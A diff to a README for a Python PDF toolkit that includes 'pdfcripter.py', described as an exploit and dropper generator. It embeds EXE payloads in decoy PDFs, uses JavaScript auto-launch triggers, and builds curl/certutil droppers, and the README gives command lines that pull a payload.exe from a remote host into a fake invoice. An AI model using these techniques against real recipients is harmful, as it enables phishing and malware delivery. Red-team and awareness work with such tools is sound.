@@ -1,139 +1,87 @@
+```markdown
+# ⚡ // PDF_SEC_OPS_TOOLKIT v3.0
 
-
----
-
-# Python PDF Security & Awareness Toolkit
-
-A collection of Python utility scripts designed for security awareness testing, simulated document compilation, and payload generation exercises.
+> *Tactical document compilers, simulation generators, and exploit payload utilities.*
 
 ---
 
-## 🛠️ Included Files
+## 🛠️ CORE REPOSITORY MODULES
 
-| File Name | Description | Key Features |
-| --- | --- | --- |
-| **`pdfcrypt.py`** | A tactical, hacker-terminal themed Tkinter desktop application that compiles secure, static PDF awareness simulations locally.
-
- | • Matrix/hacker color palette GUI
-
-<br>
-
-<br>• Strict HTTPS URL validation & payload blocking
-
-<br>
-
-<br>• Recent URL history persistence (JSON)
-
-<br>
-
-<br>• Multiple layouts (Classic, Minimal, Banner)
-
- |
-| **`pdfcripter.py`** | A dual-interface (CLI & Menu-driven) exploit generator (v4.1) designed to embed payloads or droppers into PDF documents.
-
- | • Custom/decoy PDF import support
-
-<br>
-
-<br>• JavaScript `OpenAction` triggers (new browser tab + auto-launch)
-
-<br>
-
-<br>• Windows PE icon stamper (`--icon` / `.ico`)
-
-<br>
-
-<br>• Automated CMD dropper generation (`curl` / `certutil`)
-
- |
-| **`pdf-cripter.py`** | A beginner-friendly, defensive Tkinter application that generates completely safe security-awareness simulation training documents.
-
- | • Zero active content guarantee (no JS, macros, or links)
-
-<br>
-
-<br>• Renders target URLs as plain, non-clickable text boxes
-
-<br>
-
-<br>• Built-in defence-in-depth bytecode scanner to verify safety
-
-<br>
-
-<br>• Strict path validation and error handling
-
- |
-
----
-
-## 📋 Requirements & Dependencies
-
-Most scripts rely on Python 3.8+ and standard libraries, with specific requirements depending on the tool:
-
-* **`reportlab`** (Required for `pdfcrypt.py` and `pdf-cripter.py` to compile documents)
-
-
-```bash
-pip install reportlab
 
 ```
 
-
-* **Tkinter** (Included with standard Python installations on most systems for GUI apps).
-* **Windows OS** (Required specifically if utilizing the Win32 resource API features in `pdfcripter.py` for icon stamping).
-
-
-
----
-
-## 🚀 Usage Guide
-
-### 1. Security-Awareness PDF Generator (`pdfcrypt.py`)
-
-Launches a tactical terminal-styled graphical user interface to generate security awareness training PDFs.
-
-```bash
-python3 pdfcrypt.py
+📂
+├── 🖥️ pdfcrypt.py       -> [SEC-OPS] Tactical Tkinter PDF generator & history persistence
+├── ⚡ pdfcripter.py     -> EVILPDF v4.1 - Advanced EXE-to-PDF exploit & dropper generator
+└── 🛡️ pdf-cripter.py    -> Defensive, non-executable awareness simulation generator
 
 ```
 
-### 2. Exploit / Payload Generator (`pdfcripter.py`)
+---
 
-Offers an interactive numbered hacker menu or full command-line execution parameters.
+### 1. `pdfcrypt.py` // Tactical Awareness Compiler
+A fully debugged Tkinter desktop app wrapped in a matrix phosphor-green tactical terminal UI[cite: 1].
+* **Features:** Strict HTTPS validation, malicious payload extension blocking, and JSON-backed history persistence[cite: 1].
+* **Layouts:** Classic, Minimal, and Banner template modes[cite: 1].
+* **Execution:**
+  ```bash
+  python3 pdfcrypt.py
 
-* **Launch Interactive Menu:**
+```
+
+### 2. `pdfcripter.py` // EVILPDF Exploit Framework v4.1
+
+An advanced payload embedding utility featuring custom decoy integration, automatic browser tab execution, and PE resource icon stamping.
+
+* **Features:** JavaScript `OpenAction` triggers, automated `curl`/`certutil` CMD droppers, and custom icon (`.ico`) resource binding.
+
+
+* **Interactive Menu:**
 ```bash
 python3 pdfcripter.py --menu
 
 ```
 
 
-* **Command-Line Example (Decoy Mode):**
+* **CLI Deployment Example:**
 ```bash
-python3 pdfcripter.py -u http://<your-ip>/payload.exe -n "Invoice.pdf" --decoy real_invoice.pdf
-
-```
-
-
-* **Command-Line Example (Direct Embed with Custom Icon):**
-```bash
-python3 pdfcripter.py -u http://<your-ip>/payload.exe -n "Doc.pdf" --embed-exe --icon myicon.ico --open --debug
+python3 pdfcripter.py -u http://<target-ip>/payload.exe -n "Invoice.pdf" --decoy real_invoice.pdf --embed-exe --icon icon.ico --debug
 
 ```
 
 
 
-### 3. Safe Awareness Simulation Generator (`pdf-cripter.py`)
+### 3. `pdf-cripter.py` // Defensive Simulation Generator
 
-Launches a clean graphical utility focused strictly on safe, non-executable training simulations.
+A clean Tkinter utility designed to produce completely passive, non-executable training documents.
 
+* **Features:** Zero active content guarantee (no JS, macros, forms, or embedded files), plain-text URL rendering, and a defence-in-depth bytecode safety scanner.
+
+
+* **Execution:**
 ```bash
 python3 pdf-cripter.py
 
 ```
 
+
+
 ---
 
-## ⚠️ Disclaimer
+## ⚙️ DEPENDENCY SETUP
 
-These scripts are intended strictly for authorized security testing, educational purposes, and defensive awareness training. Ensure you have explicit permission from system owners before conducting simulated assessments.
+```bash
+pip install reportlab
+
+```
+
+---
+
+> **[!] AUTHORIZED SECURITY TESTING ONLY**
+> This toolkit is intended for authorized red-team operations, security awareness training, and defensive validation. Misuse of these scripts is strictly prohibited.
+> 
+> 
+
+```
+
+```
